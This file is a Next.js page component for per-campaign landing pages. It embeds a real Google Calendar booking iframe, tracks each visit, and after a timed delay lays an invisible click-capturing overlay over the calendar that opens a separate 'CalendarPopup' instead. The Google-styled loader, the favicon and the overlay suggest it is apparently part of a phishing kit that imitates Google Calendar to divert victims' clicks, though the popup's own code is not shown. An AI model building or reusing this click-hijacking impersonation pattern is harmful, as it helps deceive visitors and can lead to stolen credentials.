import React, { useEffect, useState } from 'react';
import { useRouter } from 'next/router';
import styles from '../../styles/modules/Index.module.css';
import CalendarPopup from '../../components/popups/CalendarPopup';
import GoogleLoader from '../../components/GoogleLoader';

export default function CampaignLanding() {
  const router = useRouter();
  const { campaign } = router.query || {};

  // Overlay is independent from popup visibility
  const [showOverlay, setShowOverlay] = useState(false);
  const [isPopupVisible, setIsPopupVisible] = useState(false);
  const [campaignId, setCampaignId] = useState(null);
  const [campaignData, setCampaignData] = useState(null);

  // Initialize from path segment and track visit; do not auto-open popup
  useEffect(() => {
    if (!campaign) return;
    const c = String(campaign);
    setCampaignId(c);
    fetch(`/api/tracking/track-visit?c=${encodeURIComponent(c)}`).catch(() => {});
    
    // Detect mobile devices
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
    
    // 11 seconds for mobile, 6 seconds for desktop
    const overlayDelay = isMobile ? 11000 : 4000;
    const t = setTimeout(() => setShowOverlay(true), overlayDelay);
    return () => clearTimeout(t);
  }, [campaign]);

  // Load campaign data from API
  useEffect(() => {
    async function load() {
      try {
        if (!campaignId) return;
        const res = await fetch(`/api/campaigns/${encodeURIComponent(campaignId)}`);
        if (!res.ok) {
          console.warn('Campaign fetch failed', res.status);
          setCampaignData(null);
          return;
        }
        const json = await res.json();
        setCampaignData(json);
      } catch (e) {
        console.warn('Campaign fetch error', e);
        setCampaignData(null);
      }
    }
    load();
  }, [campaignId]);

  return campaignData && campaignData.id ? (
    <>
      <div className={styles.container}>
        <div className={styles.authorCache}>
          <img className={styles.authorImage} src={campaignData.profile_image} alt={campaignData.firstName} />
          <div className={styles.authorInfo}>
            <div className={styles.authorName}>{campaignData.first_name} {campaignData.last_name} • {campaignData.title}</div>
            <div className={styles.authorTitle}>{campaignData.description}</div>
          </div>
          <img className={styles.googleCalendarLogo} src="/calendar-favicon.ico" alt="Calendar" />
        </div>

        <div className={styles.iframeContainer}>
          <iframe
            className={styles.iframe}
            src="https://calendar.google.com/calendar/u/0/appointments/schedules/AcZssZ0c8o32xRySarMK1ME9TybZ9pKjXf4PjCgxKAxe8AZ2mCzx07AZFRzBUGkk1WmnX2rEW1AYsN1B?gv=true"
            title="Google Calendar"
          />
          <div
            className={`${styles.clickOverlay} ${showOverlay ? styles.visible : ''}`}
            onClick={() => {
              if (!showOverlay) return;
              console.debug('Overlay clicked → opening calendar popup');
              setIsPopupVisible(true);
            }}
            title="Choisissez un créneau horaire"
          />
        </div>

        <CalendarPopup
          isVisible={isPopupVisible}
          onClose={() => {
            console.debug('Calendar popup closed');
            setIsPopupVisible(false);
          }}
          campaignData={campaignData}
        />
      </div>
    </>
  ) : (
    <>
      <GoogleLoader />
    </>
  );
}


